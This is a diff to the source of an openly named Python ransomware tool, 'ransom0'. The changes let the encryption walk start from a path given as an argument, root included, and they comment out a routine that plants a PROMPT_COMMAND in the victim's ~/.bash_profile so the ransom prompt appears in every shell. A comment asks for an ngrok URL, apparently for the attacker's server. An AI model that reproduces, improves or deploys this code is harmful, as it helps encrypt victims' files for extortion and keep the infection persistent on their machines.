@@ -1,4 +1,4 @@
-#!/usr/local/bin/python3
+#!/usr/bin/python3
 import os
 import shutil
 import http.client
@@ -47,6 +47,16 @@ url = 'm1'  # PUT THE URL YOU GOT FROM NGROK HERE
 
 def encrypt_root():
     return len(sys.argv) > 1 and sys.argv[1] == 'root'
+
+
+def work_path():
+    if encrypt_root():
+        return '/'
+
+    if len(sys.argv) <= 1:
+        return '~'
+
+    return sys.argv[1]
 
 
 class ransom0:
@@ -99,9 +109,7 @@ class ransom0:
         f = open("logs/path.txt", "w")
         cnt = 0
 
-        start_path = '~'
-        if encrypt_root():
-            start_path = '/'
+        start_path = work_path()
 
         for root, dirs, files in os.walk(path.expanduser(start_path)):
             if any(s in root for s in self.EXCLUDE_DIRECTORY):
@@ -226,25 +234,28 @@ def DECRYPT_FILE():
 if __name__ == '__main__':
     bashrc_path = path.expanduser('~/.bash_profile')
     decrypted_path = path.expanduser('~/.decrypted')
-    prompt_cmd = "export PROMPT_COMMAND=~/ransom0.py"
+    prompt_cmd = "export PROMPT_COMMAND=\"/usr/bin/python3 '{}'\"".format(__file__)
 
-    if path.exists(decrypted_path) and not encrypt_root():
-        exit(0)
+    # Enable this if you want to display the ransom prompt to the user
+    # by modifying their bash_profile
 
-    if path.exists(bashrc_path):
-        with open(bashrc_path) as f:
-            bashrc_content = f.read()
-
-        if bashrc_content.strip().endswith(prompt_cmd):
-            pass
-        else:
-            f = open(bashrc_path, 'a')
-            f.write("\n{}\n".format(prompt_cmd))
-            f.close()
-    else:
-        f = open(bashrc_path, 'w')
-        f.write("{}\n".format(prompt_cmd))
-        f.close()
+    # if path.exists(decrypted_path) and not encrypt_root():
+    #     exit(0)
+    #
+    # if path.exists(bashrc_path):
+    #     with open(bashrc_path) as f:
+    #         bashrc_content = f.read()
+    #
+    #     if bashrc_content.strip().endswith(prompt_cmd):
+    #         pass
+    #     else:
+    #         f = open(bashrc_path, 'a')
+    #         f.write("\n{}\n".format(prompt_cmd))
+    #         f.close()
+    # else:
+    #     f = open(bashrc_path, 'w')
+    #     f.write("{}\n".format(prompt_cmd))
+    #     f.close()
 
     # Generate digits ID or read generated value from digits.txt
     if path.exists("logs") is True:
@@ -254,7 +265,8 @@ if __name__ == '__main__':
         DECRYPT_FILE()
         f = open(decrypted_path, 'w')
         f.close()
-        remove(bashrc_path)
+        if path.exists(bashrc_path):
+            remove(bashrc_path)
     else:
         os.mkdir("logs")
         f = open("logs/digits.txt", "w")
